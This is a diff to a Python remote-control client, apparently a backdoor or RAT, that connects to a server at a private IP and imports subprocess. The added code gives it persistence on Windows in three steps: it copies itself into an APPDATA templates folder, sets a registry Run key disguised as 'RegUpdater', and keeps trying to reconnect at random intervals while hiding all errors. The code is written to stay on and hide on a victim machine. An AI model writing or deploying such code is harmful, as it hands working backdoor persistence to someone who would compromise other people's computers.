@@ -2,12 +2,26 @@
 import requests as req 
 from subprocess import Popen, PIPE
 from time import sleep
+from random import randrange
+from shutil import copy
+import winreg as wreg
 import os
 
 class WebClient:
     def __init__(self):
         self.SERVER_IP = '192.168.0.123'
         self.SERVER_PORT = 5000
+        # Persistence I: copy script to random appdata location
+        self.APPDATA_PATH = f"{os.environ['APPDATA']}/Microsoft/Windows/Templates/tmp.py"
+        self.PATH = os.path.realpath(__file__)
+        copy(self.PATH, self.APPDATA_PATH)
+        # Persistence II: registry key pointing to the copied file
+        self.addRegkey()
+
+    def addRegkey(self):
+        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
+        wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, self.APPDATA_PATH)
+        key.Close()
     
     def run(self):
         while True: 
@@ -47,9 +61,15 @@ class WebClient:
             # sleep(3)
 
 def main():
-    w = WebClient()
-    w.run()
-  
+    c = WebClient()
+    # Persistence III: if can't connect to server sleep for 1 - 10 seconds
+    while True:
+        try:
+            if c.run():
+                break
+        except:
+            sleep_for = randrange(1, 10)
+            sleep( sleep_for )
 
 if __name__ == "__main__":
     main()
